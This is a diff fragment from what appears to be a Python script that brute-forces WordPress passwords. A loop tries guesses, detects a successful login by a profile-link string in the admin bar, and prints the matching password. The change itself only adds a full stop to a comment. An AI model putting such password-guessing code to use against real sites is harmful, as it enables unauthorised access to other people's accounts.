@@ -24,7 +24,7 @@ for guess in guesses:
     teller += 1
     print(teller)
     if 'wp-admin-bar-edit-profile' in text: # Stop when finds this text in the HTTP source, Not ideal but works
-        print('Pasword is ------------- ' + guess)  # Print out the password and stops the program
+        print('Pasword is ------------- ' + guess)  # Print out the password and stops the program.
         break
 
 
